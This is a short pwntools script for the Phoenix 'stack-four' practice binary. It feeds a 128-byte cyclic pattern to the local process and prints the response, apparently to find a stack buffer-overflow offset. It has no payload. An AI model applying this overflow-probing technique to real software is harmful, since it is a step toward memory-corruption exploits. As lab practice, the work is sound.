#!/usr/bin/env python3
from pwn import *

context.log_level = "critical"

io = process(
    "/opt/phoenix/amd64/stack-four",
)
io.sendline(cyclic(128))
print(io.recvline().decode("ascii"))
print(io.recvline().decode("ascii"))
